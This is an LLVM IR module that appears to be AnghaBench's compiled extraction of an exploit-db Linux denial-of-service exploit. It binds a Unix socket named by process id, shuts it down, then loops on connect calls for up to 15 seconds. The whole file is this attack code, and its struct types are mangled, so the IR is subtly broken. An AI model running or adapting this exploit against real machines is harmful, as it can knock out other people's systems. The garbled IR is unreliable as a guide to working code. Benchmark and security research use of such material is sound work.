; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_10022.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_10022.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_un = type { i32*, i32 }
%struct.sockaddr = type { i32 }

@PF_UNIX = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@AF_UNIX = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@SHUT_RDWR = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [10 x i8] c"connect()\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"Connection OK\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_un, align 8
  store i32 0, i32* %1, align 4
  %6 = call i32 @memset(%struct.sockaddr_un* %5, i32 0, i32 16)
  %7 = load i32, i32* @PF_UNIX, align 4
  %8 = getelementptr inbounds %struct.sockaddr_un, %struct.sockaddr_un* %5, i32 0, i32 1
  store i32 %7, i32* %8, align 8
  %9 = getelementptr inbounds %struct.sockaddr_un, %struct.sockaddr_un* %5, i32 0, i32 0
  %10 = load i32*, i32** %9, align 8
  %11 = getelementptr inbounds i32, i32* %10, i64 1
  %12 = call i32 (...) @getpid()
  %13 = call i32 @sprintf(i32* %11, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i32 %12)
  %14 = load i32, i32* @AF_UNIX, align 4
  %15 = load i32, i32* @SOCK_STREAM, align 4
  %16 = call i32 @socket(i32 %14, i32 %15, i32 0)
  store i32 %16, i32* %4, align 4
  %17 = load i32, i32* %4, align 4
  %18 = bitcast %struct.sockaddr_un* %5 to %struct.sockaddr*
  %19 = call i32 @bind(i32 %17, %struct.sockaddr* %18, i32 16)
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @listen(i32 %20, i32 1)
  %22 = load i32, i32* %4, align 4
  %23 = load i32, i32* @SHUT_RDWR, align 4
  %24 = call i32 @shutdown(i32 %22, i32 %23)
  %25 = call i32 @alarm(i32 15)
  br label %26

26:                                               ; preds = %37, %0
  %27 = load i32, i32* @AF_UNIX, align 4
  %28 = load i32, i32* @SOCK_STREAM, align 4
  %29 = call i32 @socket(i32 %27, i32 %28, i32 0)
  store i32 %29, i32* %3, align 4
  %30 = load i32, i32* %3, align 4
  %31 = bitcast %struct.sockaddr_un* %5 to %struct.sockaddr*
  %32 = call i32 @connect(i32 %30, %struct.sockaddr* %31, i32 16)
  store i32 %32, i32* %2, align 4
  %33 = load i32, i32* %2, align 4
  %34 = icmp eq i32 -1, %33
  br i1 %34, label %35, label %37

35:                                               ; preds = %26
  %36 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  br label %39

37:                                               ; preds = %26
  %38 = call i32 @puts(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  br label %26

39:                                               ; preds = %35
  ret i32 0
}

declare dso_local i32 @memset(%struct.sockaddr_un*, i32, i32) #1

declare dso_local i32 @sprintf(i32*, i8*, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @shutdown(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @puts(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
